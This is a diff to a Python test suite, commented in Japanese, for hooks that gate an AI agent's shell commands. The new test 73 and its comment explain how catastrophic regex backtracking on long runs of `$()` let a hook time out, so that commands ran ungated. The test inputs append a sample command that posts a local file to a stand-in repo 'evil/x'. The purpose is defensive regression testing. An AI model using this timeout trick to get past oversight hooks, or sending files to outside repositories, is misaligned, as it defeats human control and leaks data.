@@ -15,7 +15,8 @@ gates/hooks/coldread-gate.py)で、前の版の写しを渡すと全部の穴が
 レビュー(頼み cae1e2)の直しで、commit a192c351 の版を渡すと赤になる。66 は探しのゲートの 12 回目のレビュー(頼み cae1e2)
 の直しで、commit 3f5cae34 の版を渡すと赤になる。67 以降は投稿の前のゲートの 19 回目のレビュー(頼み cae1e2)の直しで、
 commit 9d3d014e の版を渡すと赤になる。70 以降は投稿の前のゲートの 20 回目のレビュー(頼み cae1e2)の直しで、
-commit d54ac54b の版を渡すと赤になる。
+commit d54ac54b の版を渡すと赤になる。73 以降は投稿の前のゲートの 21 回目のレビュー(頼み cae1e2)の直しで、
+commit 13863e1c の版を渡すと赤になる。
 全部が通れば FIX_OK を出し、1 件でも落ちれば落ちた番号を出して 1 で終わる。
 """
 import contextlib
@@ -1296,8 +1297,36 @@ def f72():
         cands, blk, parsed = g.posting_bodies(cmd, WORK)
         check(72, not parsed or bool(blk), "閉じたと言い切れない括弧の中の cd を見ずに本文ファイルを読んだ: %r → %r %r" % (cmd, cands, parsed))
 
+# 73. コマンド名の位置の語が展開だけかを見るのに、語の長さに対して線形の時間で済む(前は 1 本の正規表現の `\$\(.*\)` を繰り返しの中に
+# 置き、`$()$()…$()x` や `"$(echo a)…$(echo a)z foo"` のように最後で外れる語で割り方を全部試して、28 個で 30 秒かかった。
+# フックの時間切れでは、コマンドがゲートを通らずに走る)。投稿の前のゲート・宛先のゲート・探しのゲートのフックを、数千個の形で回す
+def f73():
+    for word, want in (("$(a)$(b)", True), ("$X$(a) b $(c)${Y}", True), ("`a`$1$@", True), ("$()x", False), ("$(echo a)z foo", False),
+                       ("$ab", True), ("$(a", False), ("x$(a)", False), ("", False)):
+        check(73, g.expansion_only(word) is want, "展開だけの語かを読み違えた: %r → %r" % (word, g.expansion_only(word)))
+    hooks = os.path.dirname(os.path.abspath(GATE))
+    dg_cfg = os.path.join(WORK, "dg-cfg")
+    os.makedirs(os.path.join(dg_cfg, "destgate"), exist_ok=True)
+    with open(os.path.join(dg_cfg, "destgate", "allowlist"), "w", encoding="utf-8") as f:
+        f.write("allowed/repo\n")
+    env = dict(os.environ, COLDREAD_READER_CMD="false", COLDREAD_GH_CMD="exit 1")
+    post = "; gh pr comment 1 -R evil/x --body-file long.md"
+    for head in ("$()" * 3000 + "x", '"' + "$(echo a)" * 3000 + 'z foo"', '"$(echo a)"' * 3000 + '"z foo"'):
+        for hook, tail, cfg in (("coldread-gate.py", post, os.environ["CLAUDE_CONFIG_DIR"]), ("dest-gate.py", post, dg_cfg),
+                                ("search-gate.py", "; rg foo /", os.environ["CLAUDE_CONFIG_DIR"])):
+            cmd = head + tail
+            try:
+                proc = subprocess.run([sys.executable, os.path.join(hooks, hook)], capture_output=True, text=True, timeout=20, cwd=WORK,
+                                      input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": WORK}),
+                                      env=dict(env, CLAUDE_CONFIG_DIR=cfg))
+            except subprocess.TimeoutExpired:
+                check(73, False, "%s が展開を重ねた語で 20 秒を越えた: %r" % (hook, cmd[:40]))
+                continue
+            check(73, '"deny"' in proc.stdout, "%s が展開を重ねた語の後ろのコマンドを止めなかった: %r → %r %r"
+                  % (hook, cmd[:40], proc.stdout[:200], proc.stderr[-200:]))
+
 TESTS = {n: fn for n, fn in enumerate((f1, f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12, f13, f14, f15, f16, f17, f18, f19, f20), 1)}
-TESTS.update({21: f21, 22: f22, 23: f23, 24: f24, 25: f25, 26: f26, 27: f27, 28: f28, 30: f30, 31: f31, 32: f32, 33: f33, 34: f34, 35: f35, 36: f36, 37: f37, 38: f38, 39: f39, 40: f40, 41: f41, 42: f42, 43: f43, 44: f44, 45: f45, 46: f46, 47: f47, 48: f48, 49: f49, 50: f50, 51: f51, 52: f52, 53: f53, 54: f54, 55: f55, 56: f56, 57: f57, 58: f58, 59: f59, 60: f60, 61: f61, 62: f62, 63: f63, 64: f64, 65: f65, 66: f66, 67: f67, 68: f68, 69: f69, 70: f70, 71: f71, 72: f72})
+TESTS.update({21: f21, 22: f22, 23: f23, 24: f24, 25: f25, 26: f26, 27: f27, 28: f28, 30: f30, 31: f31, 32: f32, 33: f33, 34: f34, 35: f35, 36: f36, 37: f37, 38: f38, 39: f39, 40: f40, 41: f41, 42: f42, 43: f43, 44: f44, 45: f45, 46: f46, 47: f47, 48: f48, 49: f49, 50: f50, 51: f51, 52: f52, 53: f53, 54: f54, 55: f55, 56: f56, 57: f57, 58: f58, 59: f59, 60: f60, 61: f61, 62: f62, 63: f63, 64: f64, 65: f65, 66: f66, 67: f67, 68: f68, 69: f69, 70: f70, 71: f71, 72: f72, 73: f73})
 for n, fn in sorted(TESTS.items()):
     guarded(n, fn)
 
